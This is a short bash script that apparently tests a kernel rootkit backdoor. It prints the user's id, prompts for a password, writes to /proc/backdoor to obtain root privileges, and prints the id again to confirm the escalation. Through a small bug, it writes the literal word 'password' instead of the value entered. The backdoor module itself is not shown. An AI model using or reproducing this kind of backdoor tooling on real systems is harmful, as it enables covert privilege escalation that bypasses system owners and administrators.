#!/usr/bin/env bash

# The testing script for the root backdoor functionality.

echo 'before priviledge promotion'
echo '------------------------'
id
echo '------------------------'

read -p 'input password: ' password

echo 'after priviledge promotion'
echo '------------------------'
printf '%s' password > /proc/backdoor && id && sleep 30s
echo '------------------------'
